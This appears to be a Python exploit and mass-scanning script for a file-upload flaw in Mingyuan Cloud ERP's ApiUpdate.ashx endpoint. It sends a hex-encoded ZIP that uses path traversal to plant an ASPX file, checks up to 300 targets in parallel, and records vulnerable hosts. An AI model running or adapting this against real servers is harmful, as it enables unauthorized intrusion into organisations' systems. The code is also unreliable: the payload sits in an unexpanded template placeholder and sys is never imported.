# 
import requests,argparse,time
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings() # 解除警告
GREEN = '\033[92m'
RESET = '\033[0m'
proxies = { 
       "http": "http://127.0.0.1:8080", 
       "https": "http://127.0.0.1:8080" 
       }
def banner():
	banner = """

	██████╗██╗  ██╗ ██████╗ ███████╗███████╗███╗   ██╗ ██╗
██╔════╝██║  ██║██╔═══██╗██╔════╝██╔════╝████╗  ██║███║
██║     ███████║██║   ██║███████╗█████╗  ██╔██╗ ██║╚██║
██║     ██╔══██║██║   ██║╚════██║██╔══╝  ██║╚██╗██║ ██║
╚██████╗██║  ██║╚██████╔╝███████║███████╗██║ ╚████║ ██║
 ╚═════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═══╝ ╚═╝
                                     info:明源云 ERP ApiUpdate.ashx 文件上传漏洞
	"""
	print(banner)
def poc(target):
	payload_url = "/myunke/ApiUpdateTool/ApiUpdate.ashx?apiocode=a"
	url = target + payload_url
	headers={
		"Accept-Encoding": "gzip",
		"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3)AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15",
		"Content-Length": "856"
	}	
	data = "{{hexdec(504B030414000000080063740E576AE37B2383000000940000001D0000002E2E2F2E2E2F2E2E2F666463636C6F75642F5F2F746573742E6173707825CC490AC2401404D0BDA7685A02C9A62F90288A22041C42E2B0FE4A11033DD983E0EDFDE2AEA8575453AC444723C49EEC98392CE4662E45B16C185AE35D48E24806D1D3836DF8C404A3DAD37F227A066723D42D4C09A53C23A66BD65656F56ED2505B68703F20BC11D4817C47E959F678651EAA4BD06A7D8F4EE7841F5455CDB7B32F504B0102140314000000080063740E576AE37B2383000000940000001D00000000000000000000008001000000002E2E2F2E2E2F2E2E2F666463636C6F75642F5F2F746573742E61737078504B050600000000010001004B000000BE0000000000)}}"

	try:
		res = requests.get(url=target,verify=False)
		res1 = requests.post(url=url,headers=headers,data=data,verify=False)
		if res.status_code == 200:
			if res1.status_code == 200 and "Message" in res1.text:
				print(f"{GREEN}[+]该url存在文件上传漏洞：{target}{RESET}")
				with open("result.txt","a",encoding="utf-8") as f:
					f.write(target+"\n")
			else:
				print(f"[-]该url不存在文件上传漏洞：{target}")
		else:
			print(f"该url连接失败：{target}")
	except:
		print(f"[*]该url出现错误：{target}")

def main():
	banner()
	parser = argparse.ArgumentParser()
	parser.add_argument("-u","--url",dest="url",type=str,help="please write link")
	parser.add_argument("-f","--file",dest="file",type=str,help="please write file\'path")
	args = parser.parse_args()
	if args.url and not args.file:
		poc(args.url)
	elif args.file and not args.url:
		url_list = []
		with open(args.file,"r",encoding="utf-8") as f:
			for i in f.readlines():
				url_list.append(i.strip().replace("\n",""))
		mp = Pool(300)
		mp.map(poc,url_list)
		mp.close()
		mp.join()
	else:
		print(f"\n\tUage:python {sys.argv[0]} -h")


if __name__ == "__main__":
	main()